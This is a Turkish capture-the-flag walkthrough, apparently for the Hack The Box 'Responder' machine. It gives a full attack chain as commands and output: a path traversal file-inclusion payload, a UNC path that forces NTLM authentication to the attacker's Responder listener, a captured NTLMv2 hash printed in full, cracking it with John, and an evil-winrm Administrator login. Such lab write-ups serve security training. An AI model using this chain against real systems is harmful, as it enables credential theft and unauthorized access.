---
glightbox: true
---

# Responder

!!! info "Target IP Address"

    10.129.95.234

Hedef makine için Nmap taraması gerçekleştir:

```bash
sudo nmap 10.129.95.234 -p- -Pn -T5
```

```text title="Output" hl_lines="6 7"
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-22 00:26 +03
Nmap scan report for 10.129.95.234
Host is up (0.22s latency).
Not shown: 5998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 57.09 seconds
```

Web tarayıcısında [http://10.129.95.234](http://10.129.95.234) adresine gidildiğinde yönlendirilen siteye (`unika.htb`) erişebilmek için aşağıdaki komutu çalıştır:

```bash
echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hosts
```

Web tarayıcısında aşağıda verilen adrese git:

```text
http://unika.htb/index.php?page=../../../../../windows/system32/drivers/etc/hosts
```

Bu sayfaya başarılı bir şekilde erişilebiliyorsa File Inclusion zafiyeti hedef makinede mevcut demektir. Bu zafiyet kullanılarak, web sitesinde bulunan ama kullanıcılar ile paylaşılmayan dosyalar (`/etc/hosts`) görüntülenebilir.

Bu sorunun çözümünde Responder aracı kullanılacak. Bu araç ile yerel makinede bir SMB sunucusu oluşturacağız ve bu sunucunun kullandığı NTLM kimlik doğrulama yöntemine müdahale edeceğiz.

NTLM basit olarak aşağıdaki şekilde çalışır:

1. İstemci (`unika.htb`), kullanıcı adını ve alan adını sunucuya (`Responder`) gönderir.
2. Sunucu, challenge olarak adlandırılan rastgele bir karakter dizisi oluşturur.
3. İstemci, challenge dizesini kullanıcı (`unika.htb`) parolasının NTLM hash dizesiyle şifreler ve bunu sunucuya geri gönderir.
4. Sunucu, kullanıcı parolasını (veya eş değerini) alır.
5. Sunucu, challenge dizesini şifrelemek için güvenlik hesabı veri tabanından alınan hash dizeleri kullanır. Daha sonra değer, istemciden alınan değerle karşılaştırılır. Değerler eşleşirse istemcinin kimliği doğrulanır.

Responder aracını aşağıdaki şekilde başlatarak bir SMB sunucusu oluştur:

```bash
sudo responder -I tun0
```

```text title="Output"
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]

...SNIP...
```

Ardından web tarayıcısında aşağıda verilen adrese gitmeliyiz:

```text
http://unika.htb/index.php?page=//10.10.14.216/somefile
```

Burada SMB Share için yerel makinemizin IP adresini (10.10.14.2016) belirttik. Ardından gelen dosya ismi (`somefile`) önemsizdir.

Sunucunun, oluşturduğumuz SMB sunucusu ile etkileşime geçmesini beklyeceğiz. Bir süre sonra Responder tarafında gerekli hash dizesinin elde edildiği görülebilir:

```text title="Output" hl_lines="5"
...SNIP...

[SMB] NTLMv2-SSP Client   : 10.129.95.234
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:9baa08e21f5469eb:DE379677C8B5A639C49F957833D736C4:01010000000000000076B0084744DA013B9B405FFC9F95770000000002000800500033004200510001001E00570049004E002D004200360031004C00510039005600540051004F00470004003400570049004E002D004200360031004C00510039005600540051004F0047002E0050003300420051002E004C004F00430041004C000300140050003300420051002E004C004F00430041004C000500140050003300420051002E004C004F00430041004C00070008000076B0084744DA0106000400020000000800300030000000000000000100000000200000848143293A200EAA8A158BDA8ABE0F0721209D40A874ABCC951D88E07BFCDEDC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310036000000000000000000

...SNIP...
```

Elde edilen hash dizesini bir dosyaya kaydet:

```bash
echo "Administrator::RESPONDER:9baa08e21f5469eb:DE379677C8B5A639C49F957833D736C4:01010000000000000076B0084744DA013B9B405FFC9F95770000000002000800500033004200510001001E00570049004E002D004200360031004C00510039005600540051004F00470004003400570049004E002D004200360031004C00510039005600540051004F0047002E0050003300420051002E004C004F00430041004C000300140050003300420051002E004C004F00430041004C000500140050003300420051002E004C004F00430041004C00070008000076B0084744DA0106000400020000000800300030000000000000000100000000200000848143293A200EAA8A158BDA8ABE0F0721209D40A874ABCC951D88E07BFCDEDC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310036000000000000000000" > hash.txt
```

Artık John the Ripper (john) aracı ile hash kırılarak parola elde edilebilir:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

```text title="Output" hl_lines="5"
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2024-01-22 00:14) 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Daha önceden gerçekleştirilen Nmap taramasında, 5985 numaralı portun açık olduğu bilgisini elde etmiştik. Bu sebeple WinRM ile bağlantı gerçekleştirilebilir:

```bash
evil-winrm -i 10.129.95.234 -u Administrator -p badminton
```

Giriş sağlandıktan sonra aşağıdaki komut ile bayrağı ele geçir:

```powershell
Get-Content "C:\Users\mike\Desktop\flag.txt"
```
